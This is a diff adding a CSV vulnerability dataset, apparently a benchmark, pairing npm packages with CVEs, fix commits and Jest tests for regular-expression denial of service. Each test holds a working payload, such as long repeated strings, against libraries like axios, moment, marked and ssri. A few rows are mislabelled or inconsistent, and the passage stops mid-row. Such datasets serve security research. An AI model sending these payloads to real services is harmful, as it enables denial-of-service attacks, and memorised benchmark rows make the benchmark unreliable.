@@ -1,0 +1,1319 @@
+Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
+redos,,revalidator,0.3.1,n/a,redos/revalidator_0.3.1,"test(""ReDos in revalidator"", () => {
+  const revalidator = require(""revalidator"");
+  const measureTime = require(""../utils"").measureTime;
+  var myObj = {
+    url: ""ftp://0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0."",
+  };
+  let t = measureTime(function () {
+    revalidator.validate(myObj, {
+      properties: {
+        url: {
+          description: ""the url the object should be stored at"",
+          type: ""string"",
+          format: ""url"",
+          required: true,
+        },
+      },
+    });
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,revalidator.js:289:19,https://securitylab.github.com/advisories/GHSL-2020-352-redos-revalidator/; 
+redos,,github-url-to-object,4.0.2,4.0.4,redos/github-url-to-object_4.0.2,"test(""ReDos in github-url-to-object"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const gh = require(""github-url-to-object"");
+  let prefix = ""a/a"";
+  let pump = ""a"";
+  let suffix = ""a/"";
+  let attackString = prefix;
+  for (let i = 0; i < 25000; i++) {
+    attackString += pump;
+  }
+  attackString += suffix;
+  let t = measureTime(function () {
+    gh(attackString);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,commonjs.js:19:27,https://security.snyk.io/vuln/npm:github-url-to-object:20180226; 
+redos,CVE-2021-27290,ssri,8.0.0,8.0.1,redos/ssri_8.0.0,"test(""ReDos in ssri"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const ssri = require(""ssri"");
+  const integrity =
+    ""sha512-00000000000000000000000000000000000000000000"" +
+    ""?"".repeat(25) +
+    ""\x1F"";
+  let t = measureTime(function () {
+    const parsed = ssri.parse(integrity, {
+      strict: true,
+      single: true,
+    });
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/npm/ssri/commit/76e223317d971f19e4db8191865bdad5edee40d2,index.js:123:31,https://security.snyk.io/vuln/SNYK-JS-SSRI-1246392; https://github.com/advisories/GHSA-vx3p-948g-6vhq
+redos,CVE-2017-16116,string,3.3.3,n/a,redos/string_3.3.3,"test(""ReDos in string"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const string = require(""string"");
+  let t = measureTime(function () {
+    string(genstr(50000, ""9"")).underscore();
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",,string.js:618:68,https://security.snyk.io/vuln/npm:string:20170907; https://github.com/advisories/GHSA-g36h-6r4f-3mqp
+redos,CVE-2021-3807,ansi-regex,4.1.0,>=2.1.1 <3.0.1 >=4.0.0 <4.1.1 >=5.0.0 <5.0.1 >=6.0.0 <6.0.1,redos/ansi-regex_4.1.0,"test(""ReDos in ansi-regex"", () => {
+  const ansiRegex = require(""ansi-regex"");
+  const measureTime = require(""../utils"").measureTime;
+  var attack_str = ""\u001B[""+"";"".repeat(2*10000);
+  let t = measureTime(function () {
+    ansiRegex().test(attack_str); 
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1,,https://security.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908; 
+redos,,checkit,0.7.0,n/a,redos/checkit_0.7.0,"test(""ReDoS in checkit"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const check = require(""checkit"");
+  const prefix = ""http://a"";
+  const pump = ""a"";
+  const suffix = ""\t"";
+  const nPumps = 1000000;
+  let url = prefix;
+  for (let i = 0; i < nPumps; i++) {
+    url += pump;
+  }
+  url += suffix;
+  let t = measureTime(function () {
+    check(url);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/tgriesser/checkit/pull/94,,https://security.snyk.io/vuln/npm:checkit:20180226; 
+redos,,remove-markdown,0.3.0,n/a,redos/remove-markdown_0.3.0,"test(""ReDos in remove-markdown"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const removeMarkdown = require(""remove-markdown"");
+  const paragraph =
+    '\n## This is a long ""' + "" "".repeat(200) + '"" heading ##\n';
+  let t = measureTime(function () {
+    removeMarkdown(paragraph);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,index.js:48:8,https://security.snyk.io/vuln/SNYK-JS-REMOVEMARKDOWN-73635; 
+redos,CVE-2021-3803,nth-check,2.0.0,2.0.1,redos/nth-check_2.0.0,"//https://huntr.dev/bounties/8cf8cc06-d2cf-4b4e-b42c-99fafb0b04d0/
+test(""ReDos in nth-check"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const nthCheck = require(""nth-check"");
+
+  let attack_str = ""2n"" + "" "".repeat(50000) + ""!"";
+
+  let t = measureTime(function () {
+    try {
+      nthCheck.parse(attack_str);
+    } catch (e) {}
+  });
+
+  let time = t[0] + t[1] / 1000000000;
+
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726,parse.js:22:26,https://github.com/advisories/GHSA-rp65-9cf3-cjxr; https://security.snyk.io/vuln/SNYK-JS-NTHCHECK-1586032
+redos,CVE-2020-7753,trim,0.0.1,0.0.3,redos/trim_0.0.1,"test(""ReDos in trim"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const trim = require(""trim"");
+  let t = measureTime(function () {
+    trim(""1"" + "" "".repeat(50000) + ""1"");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",,index.js:5:14,https://security.snyk.io/vuln/SNYK-JS-TRIM-1017038; https://github.com/advisories/GHSA-w5p7-h5w8-2hfq
+redos,CVE-2021-3749,axios,0.21.0,0.21.3,redos/axios_0.21.0,"function build_blank(n) {
+  var ret = ""1"";
+  for (var i = 0; i < n; i++) {
+    ret += "" "";
+  }
+  return ret + ""1"";
+}
+test(""ReDoS in axios"", () => {
+  const { trim } = require(""axios/lib/utils"");
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    trim(build_blank(50000));
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/axios/axios/commit/5b457116e31db0e88fede6c428e969e87f290929,utils.js:190:34,https://security.snyk.io/vuln/SNYK-JS-AXIOS-1579269; https://github.com/advisories/GHSA-cph5-m8f7-6c5x
+redos,CVE-2017-16119,fresh,0.5.0,0.5.2,redos/fresh_0.5.0,"test(""ReDos in fresh"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  var fresh = require(""fresh"");
+  let str = genstr(60000, "" "") + ""x"";
+  let t = measureTime(function () {
+    fresh({ ""if-none-match"": str }, { etag: 23 });
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/jshttp/fresh/commit/21a0f0c2a5f447e0d40bc16be0c23fa98a7b46ec,index.js:61:40,https://security.snyk.io/vuln/npm:fresh:20170908; https://github.com/advisories/GHSA-9qj9-36jm-prpv
+redos,CVE-2021-23353,jspdf,2.1.1,2.3.1,redos/jspdf_2.1.1,"test(""ReDos in jspdf"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const { jsPDF } = require(""jspdf"");
+  const doc = new jsPDF();
+  doc.text(""Hello world"", 10, 10);
+  let t = measureTime(function () {
+    try {      
+      doc.addImage(""data:image/jpeg;"" + ""charset=x"".repeat(25) + ""!base64,"", 'JPEG', 1, 2);
+    } catch (e) {}
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/MrRio/jsPDF/commit/d8bb3b39efcd129994f7a3b01b632164144ec43e,jspdf.node.min.js:86:5935,https://security.snyk.io/vuln/SNYK-JS-JSPDF-1073626; https://github.com/advisories/GHSA-57f3-gghm-9mhc
+redos,CVE-2017-16099,no-case,2.3.1,2.3.2,redos/no-case_2.3.1,"test(""ReDos in no-case"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const cc = require(""no-case"");
+  let t = measureTime(function () {
+    cc(genstr(50000, ""X""));
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,no-case.js:34:6,https://security.snyk.io/vuln/npm:no-case:20170908; https://github.com/advisories/GHSA-ff6r-5jwm-8292
+redos,,platform,1.3.4,n/a,redos/platform_1.3.4,"test(""ReDos in platform"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const platform = require(""platform"");
+  let t = measureTime(function () {
+    var agent = platform.parse(""Windows Icarus6j"" + genstr(40000, "" "") + "" "");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,platform.js:117:10,https://security.snyk.io/vuln/npm:platform.js:20170907; 
+redos,CVE-2021-23343,path-parse,1.0.6,1.0.7,redos/path-parse_1.0.6,"function build_attack(n) {
+  var ret = """";
+  for (var i = 0; i < n; i++) {
+    ret += ""/"";
+  }
+  return ret + ""\u25CE"";
+}
+test(""ReDos in path-parse"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const pathParse = require(""path-parse"");
+  let t = measureTime(function () {
+    let attack_str = build_attack(50000);
+    pathParse(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,index.js:59:22,https://security.snyk.io/vuln/SNYK-JS-PATHPARSE-1077067; https://github.com/advisories/GHSA-hj48-42vr-x3v9
+redos,,ramda,0.27.1,0.27.2,redos/ramda_0.27.1,"//https://www.huntr.dev/bounties/51dfe927-1bf1-4b36-91ca-2197337e663a/
+test(""ReDos in ramda"", () => {
+  const { trim } = require(""ramda"");
+  const measureTime = require(""../utils"").measureTime;
+  let attack_str = ""a"" + "" "".repeat(33000) + ""a"";
+
+  let t = measureTime(function () {
+    trim(build_blank(50000));
+  });
+
+  let time = t[0] + t[1] / 1000000000;
+
+  expect(time).toBeGreaterThan(1);
+});
+
+function build_blank(n) {
+  var ret = ""1"";
+  for (var i = 0; i < n; i++) {
+    ret += "" "";
+  }
+
+  return ret + ""1"";
+}
+",https://github.com/ramda/ramda/commit/37af6ae2ca8b94656996dd27fb0a1f208d69134e,trim.js:33:35,; https://security.snyk.io/vuln/SNYK-JS-RAMDA-1582370
+redos,CVE-2015-8315,millisecond,0.1.1,0.1.2,redos/millisecond_0.1.1,"test(""ReDos in millisecond"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  var ms = require(""millisecond"");
+  let attack_str = genstr(20000, ""1"") + ""x"";
+  let t = measureTime(function () {
+    ms(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,index.js:43:21,https://security.snyk.io/vuln/npm:millisecond:20151120; https://github.com/advisories/GHSA-3fx5-fwvr-xrjg
+redos,,papaparse,5.1.1,5.2.0,redos/papaparse_5.1.1,"test(""ReDos in ssri"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const Papa = require(""papaparse"");
+  const input = ""0"".repeat(30000);
+  const options = { dynamicTyping: true };
+  let t = measureTime(function () {
+    Papa.parse(input + ""a"", options);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/mholt/PapaParse/commit/235a12758cd77266d2e98fd715f53536b34ad621,papaparse.js:1142:14,https://security.snyk.io/vuln/SNYK-JS-PAPAPARSE-564258; https://github.com/advisories/GHSA-qvjc-g5vr-mfgr
+redos,,rgb2hex,0.1.0,0.1.6,redos/rgb2hex_0.1.0,"//https://hackerone.com/reports/319629
+test(""ReDos in rgb2hex"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const rgb2hex = require(""rgb2hex"");
+
+  const color = ""rgb("" + genstr(14, ""0000,"") + ""000"";
+
+  let t = measureTime(function () {
+    try {
+      rgb2hex(color);
+    } catch {}
+  });
+
+  let time = t[0] + t[1] / 1000000000;
+
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,index.js:25:73,https://security.snyk.io/vuln/npm:rgb2hex:20180429; https://github.com/advisories/GHSA-65p8-3hm4-h9h8
+redos,,conventional-commits-parser,3.2.0,3.2.3,redos/conventional-commits-parser_3.2.0,"test(""ReDos in conventional-commits-parser"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const conventionalCommitsParser = require(""conventional-commits-parser"");
+  let payload = ""b"" + ""\r\n"".repeat(2000000) + ""b"";
+  let t = measureTime(function () {
+    conventionalCommitsParser(payload);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/conventional-changelog/conventional-changelog/commit/c696fa35f93e0ee13728d6cf1221587ac6386311,,https://github.com/conventional-changelog/conventional-changelog/pull/861/commits/2fcd2d4e2a05986b3cd410d2d0db7d975ccca0f1; https://security.snyk.io/vuln/SNYK-JS-CONVENTIONALCOMMITSPARSER-1766960
+redos,,content,3.0.5,4.0.4,redos/content_3.0.5,"test(""ReDoS in content"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const content = require(""content"");
+  let t = measureTime(function () {
+    content.disposition(""form-data;x"" + "" "".repeat(2000));
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/hapijs/content/commit/96beb34f7c38a08d024dbf9cd63865c56e2955d9,index.js:84:34,https://security.snyk.io/vuln/npm:content:20180305; https://github.com/advisories/GHSA-x6wp-rfwh-hcx7
+redos,,content-type-parser,1.0.1,n/a,redos/content-type-parser_1.0.1,"test(""ReDoS in content-type-parser"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const contentTypeParser = require(""content-type-parser"");
+  let t = measureTime(function () {
+    contentTypeParser(""/"".repeat(30000) + ""\r\n"");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/jsdom/whatwg-mimetype/commit/26c539a699778f8743b8319c298b5fb28a4328d0,content-type-parser.js:61:46,https://security.snyk.io/vuln/npm:content-type-parser:20170905; 
+redos,,natural,5.1.0,5.1.11,redos/natural_5.1.0,"test(""ReDos in natural"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const diceCoefficient = require(""natural/lib/natural/distance/dice_coefficient.js"");
+  let attack_str = ""a"" + "" "".repeat(33000) + ""a"";
+  let t = measureTime(function () {
+    diceCoefficient(attack_str, attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/NaturalNode/natural/commit/90e85afb20e76560bc555d83abad3bc919388381,dice_coefficient.js:54:28,https://github.com/NaturalNode/natural/issues/625; https://security.snyk.io/vuln/SNYK-JS-NATURAL-1915418
+redos,CVE-2021-3868,prompts,2.4.0,2.4.2,redos/prompts_2.4.0,"//https://security.snyk.io/vuln/SNYK-JS-PROMPTS-1729737
+test(""ReDos in prompts"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const strip = require(""prompts/lib/util/strip.js"");
+
+  let attack_str = ""\u001B["" + "";"".repeat(16000);
+
+  let t = measureTime(function () {
+    strip(attack_str);
+  });
+
+  let time = t[0] + t[1] / 1000000000;
+
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,strip.js:10:40,https://security.snyk.io/vuln/SNYK-JS-PROMPTS-1729737; 
+redos,CVE-2020-27511,prototype,0.0.5,n/a,redos/prototype_0.0.5,"test(""ReDos in prototype"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const prototype = require(""prototype/lib/String"");
+  let t = measureTime(function () {
+    let attack_str = ""hello <span> <a "" + genstr(37, ""'"") + ""!"";
+    attack_str.stripTags();
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,String.js:84:17,https://github.com/yetingli/PoCs/blob/main/CVE-2020-27511/Prototype.md; 
+redos,,vant,2.12.11,3.0.7,redos/vant_2.12.11,"test(""ReDos in vant"", () => {
+  const isEmail = require(""vant/lib/utils/validate/email"").isEmail;
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    var check = isEmail(
+      ""a@0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.""
+    );
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,email.js:9:14,https://securitylab.github.com/advisories/GHSL-2020-343-redos-Vant/; 
+redos,,html-dom-parser,0.1.2,0.1.3,redos/html-dom-parser_0.1.2,"test(""ReDos in html-dom-parser"", () => {
+  const parse = require(""html-dom-parser"");
+  const measureTime = require(""../utils"").measureTime;
+  const genstr = require(""../utils"").genstr;
+  let attack_str = ""<head"" + genstr(4000000, "" S"");
+  let t = measureTime(function () {
+    parse(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/remarkablemark/html-dom-parser/commit/b80d699bbbd45d254379e6916152c918998e3b10,,https://security.snyk.io/vuln/npm:html-dom-parser:20180220; 
+redos,CVE-2017-15010,tough-cookie,2.3.2,2.3.3,redos/tough-cookie_2.3.2,"test(""ReDos in tough-cookie"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const tough = require(""tough-cookie"");
+  let str = ""x"" + genstr(50000, "" "") + ""x"";
+  let Cookie = tough.Cookie;
+  let t = measureTime(function () {
+    var cookie = Cookie.parse(str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,cookie.js:330:23,https://security.snyk.io/vuln/npm:tough-cookie:20170905; https://github.com/advisories/GHSA-g7q5-pjjr-gqvp
+redos,CVE-2022-21670,markdown-it,9.1.0,12.3.2,redos/markdown-it_9.1.0,"test(""ReDos in markdown-it"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    require(""markdown-it"")(""commonmark"").parse(""*_"".repeat(60000));
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/markdown-it/markdown-it/commit/ffc49ab46b5b751cd2be0aabb146f2ef84986101,,https://security.snyk.io/vuln/SNYK-JS-MARKDOWNIT-2331914; 
+redos,CVE-2021-23371,chrono-node,2.2.3,2.2.4,redos/chrono-node_2.2.3,"test(""ReDoS in chrono-node"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const chrono = require(""chrono-node"");
+  let attack_str = ""BGR3"" + "" "".repeat(40000) + ""186'"";
+  let t = measureTime(function () {
+    chrono.parse(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/wanasit/chrono/commit/98815b57622443b5c498a427210ebd603d705f4c,chrono.js:42:29,https://security.snyk.io/vuln/SNYK-JS-CHRONONODE-1083228; https://github.com/advisories/GHSA-hpmr-g4pq-jhgp
+redos,CVE-2021-21306,marked,0.3.6,2.0.0,redos/marked_0.3.6,"test(""ReDos in marked"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const marked = require(""marked"");
+  let str = genstr(8, ""`"") + genstr(700, "" "") + genstr(11, ""`"");
+  let t = measureTime(function () {
+    var agent = marked(str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/markedjs/marked/commit/7293251c438e3ee968970f7609f1a27f9007bccd,marked.js:662:31,https://security.snyk.io/vuln/SNYK-JS-MARKED-1070800; https://github.com/advisories/GHSA-4r62-v4vq-hr96
+redos,CVE-2021-23392,locutus,2.0.10,2.0.15,redos/locutus_2.0.10,"test(""ReDos in locutus"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const inet_pton = require(""locutus/php/network/inet_pton"");
+  const attack_str = new Array(30).fill(""a"").join("""") + ""."";
+  let t = measureTime(function () {
+    inet_pton(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/locutusjs/locutus/commit/eb863321990e7e5514aa14f68b8d9978ece9e65e,inet_pton.js:30:9,https://security.snyk.io/vuln/SNYK-JS-LOCUTUS-1090597; https://github.com/advisories/GHSA-39q4-p535-c852
+redos,,simple-markdown,0.7.2,0.6.1,redos/simple-markdown_0.7.2,"test(""ReDos in simple-markdown"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const SimpleMarkdown = require(""simple-markdown"");
+  const mdParse = SimpleMarkdown.defaultBlockParse;
+  let t = measureTime(function () {
+    mdParse(
+      ""~~\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}\\}}~""
+    );
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/Khan/simple-markdown/commit/015a719bf5cdc561feea05500ecb3274ef609cd2,simple-markdown.js:492:26,https://security.snyk.io/vuln/SNYK-JS-SIMPLEMARKDOWN-469242; https://github.com/advisories/GHSA-qj3f-9gmq-fwv5
+redos,CVE-2017-16138,mime,1.4.0,2.0.3,redos/mime_1.4.0,"test(""ReDos in mime"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const mime = require(""mime"");
+  let str = genstr(81750, ""5"") + """";
+  let t = measureTime(function () {
+    mime.lookup(str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/broofa/node-mime/commit/1df903fdeb9ae7eaa048795b8d580ce2c98f40b0,mime.js:70:18,https://security.snyk.io/vuln/npm:mime:20170907; https://github.com/advisories/GHSA-wrvr-8mpx-r7pp
+redos,,sanitize,2.0.0, 2.1.0,redos/sanitize_2.0.0,"test(""ReDos in sanitize"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const sanitize = require(""sanitize"");
+  const sanitizer = sanitize();
+  let t = measureTime(function () {
+    sanitizer.my.url(""a"" + (""."" + ""a"".repeat(55)).repeat(4) + ""#"");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/pocketly/node-sanitize/commit/4fd57530367ea9f2570b1e57d1a1a32e7f5d644f#diff-bd042f5439b55acdcce363c79e2f55d6R148,Sanitizer.js:148:37,https://security.snyk.io/vuln/npm:sanitize:20180225; 
+redos,CVE-2017-18077,brace-expansion,1.1.6,1.1.7,redos/brace-expansion_1.1.6,"test(""ReDoS in brace-expansion"", () => {
+  const expand = require(""brace-expansion"");
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    expand(""{"" + "","".repeat(24) + ""\n}"");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/juliangruber/brace-expansion/pull/35/commits/b13381281cead487cbdbfd6a69fb097ea5e456c3,index.js:109:35,https://security.snyk.io/vuln/npm:brace-expansion:20170302; https://github.com/advisories/GHSA-832h-xg76-4gv6
+redos,CVE-2020-26289,date-and-time,0.14.1,0.14.2,redos/date-and-time_0.14.1,"test(""ReDoS in date-and-time"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const date = require(""date-and-time"");
+  let attack_str = ""["" + ""z"".repeat(25) + """";
+  let t = measureTime(function () {
+    date.compile(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/knowledgecode/date-and-time/commit/9e4b501eacddccc8b1f559fb414f48472ee17c2a,date-and-time.js:141:27,https://security.snyk.io/vuln/SNYK-JS-DATEANDTIME-1054430; https://github.com/advisories/GHSA-r92x-f52r-x54g
+redos,CVE-2017-18214,moment,2.18.1,2.19.3,redos/moment_2.18.1,"test(""ReDos in moment"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const moment = require(""moment"");
+  let str = genstr(50000, ""1"") + """";
+  let t = measureTime(function () {
+    moment(str, ""MMM"");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,moment.js:2364:31,https://security.snyk.io/vuln/npm:moment:20170905; https://github.com/advisories/GHSA-446m-mv8f-q348
+redos,,email-existence,0.1.5,0.1.6,redos/email-existence_0.1.5,"test(""ReDos in email-existence"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const emailExistence = require(""email-existence"");
+  let t = measureTime(function () {
+    emailExistence.check(""@"".repeat(50000) + "" "", () => {});
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/nmanousos/email-existence/commit/0029ba71b6ad0d8ec0baa2ecc6256d038bdd9b56,index.js:8:19,https://security.snyk.io/vuln/npm:email-existence:20180225; 
+redos,,markdown-to-jsx,5.4.2,n/a,redos/markdown-to-jsx_5.4.2,"test(""ReDos in markdown-to-jsx"", () => {
+  const { compiler } = require(""markdown-to-jsx"");
+  const measureTime = require(""../utils"").measureTime;
+  const { genstr } = require(""../utils"");
+  attack_str = '<a foobar=""foo' + genstr(90000, ""\\!"") + ""/>"";
+  let t = measureTime(function () {
+    compiler(attack_str, { disableParsingRawHTML: false });
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,,https://securitylab.github.com/advisories/GHSL-2020-300-redos-markdown-to-jsx/; 
+redos,,d3-color,2.0.0,n/a,redos/d3-color_2.0.0,"test(""ReDoS in d3-color"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const d3Color = require(""d3-color"");
+  let attack_str = ""rgb("" + ""1"".repeat(80000) + ""!"";
+  let t = measureTime(function () {
+    d3Color.rgb(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/d3/d3-color/commit/4c2be7e59a317d0af7c3d66e44fa888f02163a59,d3-color.js:221:27,https://security.snyk.io/vuln/SNYK-JS-D3COLOR-1076592; 
+redos,,highlight.js,10.4.0,10.4.1,redos/highlight.js_10.4.0,"test(""ReDos in highlight.js"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  let hljs = require(""highlight.js/lib/core"");
+  let r = require(""highlight.js/lib/languages/r"");
+  hljs.registerLanguage(""r"", r);
+  let t = measureTime(function () {
+    hljs.highlight(
+      ""r"",
+      ""#' @param `x"" + ""\\_"".repeat(22) + ""_ code{numeric} foobar""
+    ).value;
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/highlightjs/highlight.js/commit/373b9d862401162e832ce77305e49b859e110f9c,core.js:858:36,https://security.snyk.io/vuln/SNYK-JS-HIGHLIGHTJS-1048676; https://github.com/advisories/GHSA-vfrc-7r7c-w9mx
+redos,,is-my-json-valid,2.20.1,2.20.2,redos/is-my-json-valid_2.20.1,"test(""ReDos in is-my-json-valid"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const imjv = require(""is-my-json-valid"");
+  const validate = imjv({
+    maxLength: 100,
+    format: ""style"",
+  });
+  let t = measureTime(function () {
+    validate("" "".repeat(4000));
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/mafintosh/is-my-json-valid/commit/c3fc04fc455d40e9b29537f8e2c73a28ce106edb,index.js:172:21,https://security.snyk.io/vuln/SNYK-JS-ISMYJSONVALID-597165; https://github.com/advisories/GHSA-f522-ffg8-j8r6
+redos,CVE-2020-7760,codemirror,5.58.0,5.58.2,redos/codemirror_5.58.0,"let basicCTypes = [
+  ""int"",
+  ""long"",
+  ""char"",
+  ""short"",
+  ""double"",
+  ""float"",
+  ""unsigned"",
+  ""signed"",
+  ""void"",
+  ""bool"",
+];
+function cTypes(identifier) {
+  return (
+    basicCTypes.propertyIsEnumerable(identifier) || /.+_t$/.test(identifier)
+  );
+}
+test(""ReDos in codemirror"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  let str = genstr(65536, ""a"");
+  let t = measureTime(function () {
+    cTypes(str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/codemirror/CodeMirror/commit/55d0333907117c9231ffdf555ae8824705993bbb,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-CODEMIRROR-1016937; https://github.com/advisories/GHSA-4gw3-8f77-f72c
+redos,CVE-2020-15366,ajv,5.2.2,6.12.3,redos/ajv_5.2.2,"test(""ReDoS in ajv"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  let Ajv = require(""ajv"");
+  let ajv = new Ajv();
+  let t = measureTime(function () {
+    ajv.compile({
+      type: ""object"",
+      properties: {
+        foo: {
+          type: ""string"",
+          oneOf: [{ pattern: ""if("".repeat(10000) + ""x"" + "")"".repeat(10000) }],
+        },
+      },
+    });
+  });
+  let time = t[0] + t[1] / 1000000000;
